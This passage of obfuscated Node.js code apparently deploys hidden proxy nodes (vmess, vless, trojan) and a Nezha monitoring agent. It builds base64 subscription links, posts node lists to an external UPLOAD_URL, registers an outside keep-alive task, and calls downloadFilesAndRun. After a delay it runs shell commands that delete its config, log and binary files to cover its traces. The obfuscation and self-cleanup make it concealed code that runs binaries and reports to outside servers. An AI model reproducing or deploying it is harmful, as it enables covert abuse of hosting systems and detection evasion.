_0x3e9747=_0x21b1,_0xc977c4={'v':'2','ps':''+_0x3a8261,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3e9747(0x191),'net':'ws','type':_0x3e9747(_0x2d5fec._0x31aa3f),'host':_0x501c7a,'path':_0x3e9747(_0x2d5fec._0x2c6d09),'tls':_0x3e9747(0x186),'sni':_0x501c7a,'alpn':'','fp':_0x3e9747(_0x2d5fec._0x3309c8)},_0x1e32ab=_0x3e9747(0x182)+UUID+'@'+CFIP+':'+CFPORT+_0x3e9747(_0x2d5fec._0x193c08)+_0x501c7a+_0x3e9747(0x168)+_0x501c7a+_0x3e9747(0x1ee)+_0x3a8261+_0x3e9747(0x19c)+Buffer[_0x3e9747(0x181)](JSON[_0x3e9747(0x1f6)](_0xc977c4))[_0x3e9747(0x187)](_0x3e9747(0x1d5))+_0x3e9747(_0x2d5fec._0x54db98)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x501c7a+_0x3e9747(_0x2d5fec._0x397941)+_0x501c7a+_0x3e9747(0x20d)+_0x3a8261+_0x3e9747(0x1ac);console[_0x3e9747(0x20b)](Buffer[_0x3e9747(0x181)](_0x1e32ab)[_0x3e9747(_0x2d5fec._0x108967)]('base64')),fs[_0x3e9747(0x1e7)](subPath,Buffer[_0x3e9747(0x181)](_0x1e32ab)[_0x3e9747(_0x2d5fec._0x108967)](_0x3e9747(_0x2d5fec._0x5f2dbc))),console[_0x3e9747(_0x2d5fec._0xf66d98)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x3e9747(0x1c6)]('/'+SUB_PATH,(_0x4f0504,_0x411371)=>{const _0x9b47a4=_0x3e9747,_0x1f9b41=Buffer[_0x9b47a4(_0x1f39a3._0x3eb33a)](_0x1e32ab)[_0x9b47a4(_0x1f39a3._0x58f0d5)](_0x9b47a4(_0x1f39a3._0x1f4fd4));_0x411371[_0x9b47a4(_0x1f39a3._0x441751)](_0x9b47a4(0x196),_0x9b47a4(0x1c7)),_0x411371[_0x9b47a4(0x194)](_0x1f9b41);}),_0x567c49(_0x1e32ab);},0x7d0);});}}async function uploadNodes(){const _0x2fa76f={_0x5821e8:0x17c,_0xb24018:0x1d1,_0xbe95fa:0x1cb,_0x536a1d:0x1df,_0x2635d0:0x1a1,_0x506fbb:0x1ae,_0x160b67:0x1f8,_0x46e248:0x1ed,_0x414390:0x1f6,_0x2a30ab:0x17c,_0x138d60:0x205,_0x92181c:0x20b},_0x6a8ad=_0x31212e;if(UPLOAD_URL&&PROJECT_URL){const _0x201936=PROJECT_URL+'/'+SUB_PATH,_0x4558a7={'subscription':[_0x201936]};try{const _0x4355d4=await axios[_0x6a8ad(_0x2fa76f._0x5821e8)](UPLOAD_URL+_0x6a8ad(_0x2fa76f._0xb24018),_0x4558a7,{'headers':{'Content-Type':'application/json'}});return _0x4355d4&&_0x4355d4[_0x6a8ad(0x1df)]===0xc8?(console[_0x6a8ad(0x20b)](_0x6a8ad(0x1b2)),_0x4355d4):null;}catch(_0x56224b){if(_0x56224b[_0x6a8ad(_0x2fa76f._0xbe95fa)]){if(_0x56224b['response'][_0x6a8ad(_0x2fa76f._0x536a1d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x6a8ad(_0x2fa76f._0x2635d0)](listPath))return;const _0x4e7f9f=fs[_0x6a8ad(_0x2fa76f._0x506fbb)](listPath,_0x6a8ad(_0x2fa76f._0x160b67)),_0x2b6c2b=_0x4e7f9f[_0x6a8ad(0x1bd)]('\x0a')['filter'](_0x5d8d80=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x6a8ad(0x1d7)](_0x5d8d80));if(_0x2b6c2b[_0x6a8ad(_0x2fa76f._0x46e248)]===0x0)return;const _0x393408=JSON[_0x6a8ad(_0x2fa76f._0x414390)]({'nodes':_0x2b6c2b});try{const _0x4d032f=await axios[_0x6a8ad(_0x2fa76f._0x2a30ab)](UPLOAD_URL+'/api/add-nodes',_0x393408,{'headers':{'Content-Type':_0x6a8ad(_0x2fa76f._0x138d60)}});return _0x4d032f&&_0x4d032f[_0x6a8ad(_0x2fa76f._0x536a1d)]===0xc8?(console[_0x6a8ad(_0x2fa76f._0x92181c)](_0x6a8ad(0x161)),_0x4d032f):null;}catch(_0x3ca6f2){return null;}}else return;}}function _0x21b1(_0x580920,_0x246650){const _0x28ea0e=_0x28ea();return _0x21b1=function(_0x21b186,_0x323aae){_0x21b186=_0x21b186-0x158;let _0x5ab7bc=_0x28ea0e[_0x21b186];return _0x5ab7bc;},_0x21b1(_0x580920,_0x246650);}function cleanFiles(){const _0x4dc30e={_0x18602e:0x1a2,_0x57e8a8:0x1a2,_0x5275d2:0x185},_0x376d13={_0x394748:0x20b,_0x368618:0x1d8};setTimeout(()=>{const _0x27ba3a={_0x451da9:0x20b,_0x52764a:0x159,_0x5c0831:0x1d8},_0x48c67f=_0x21b1,_0x4e0547=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4e0547[_0x48c67f(_0x4dc30e._0x18602e)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4e0547[_0x48c67f(_0x4dc30e._0x57e8a8)](phpPath);process[_0x48c67f(0x1e4)]==='win32'?exec(_0x48c67f(0x1da)+_0x4e0547[_0x48c67f(0x1e2)]('\x20')+_0x48c67f(0x1cd),_0x2c3a35=>{const _0x1754ba=_0x48c67f;console[_0x1754ba(0x1b4)](),console[_0x1754ba(_0x376d13._0x394748)]('App\x20is\x20running'),console['log'](_0x1754ba(_0x376d13._0x368618));}):exec(_0x48c67f(_0x4dc30e._0x5275d2)+_0x4e0547[_0x48c67f(0x1e2)]('\x20')+_0x48c67f(0x1a8),_0x18a6aa=>{const _0x461bd0=_0x48c67f;console[_0x461bd0(0x1b4)](),console[_0x461bd0(_0x27ba3a._0x451da9)](_0x461bd0(_0x27ba3a._0x52764a)),console[_0x461bd0(_0x27ba3a._0x451da9)](_0x461bd0(_0x27ba3a._0x5c0831));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2e8da4={_0x4eadbe:0x20b,_0x5034bb:0x205,_0x9cc234:0x1b3},_0x43e68f=_0x31212e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x43e68f(_0x2e8da4._0x4eadbe)](_0x43e68f(0x18d));return;}try{const _0x40eba2=await axios[_0x43e68f(0x17c)](_0x43e68f(0x17b),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x43e68f(_0x2e8da4._0x5034bb)}});return console[_0x43e68f(_0x2e8da4._0x4eadbe)]('automatic\x20access\x20task\x20added\x20successfully'),_0x40eba2;}catch(_0x1b0bff){return console[_0x43e68f(0x210)](_0x43e68f(_0x2e8da4._0x9cc234)+_0x1b0bff[_0x43e68f(0x1fb)]),null;}}async function startserver(){const _0x3f418a=_0x31212e;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3d5b3c){console['error'](_0x3f418a(0x16b),_0x3d5b3c);}}startserver()['catch'](_0x3e40e8=>{const _0x7dfd7a=_0x31212e;console['error'](_0x7dfd7a(0x1a7),_0x3e40e8);}),app[_0x31212e(0x15c)](PORT,()=>console['log'](_0x31212e(0x1d9)+PORT+'!'));
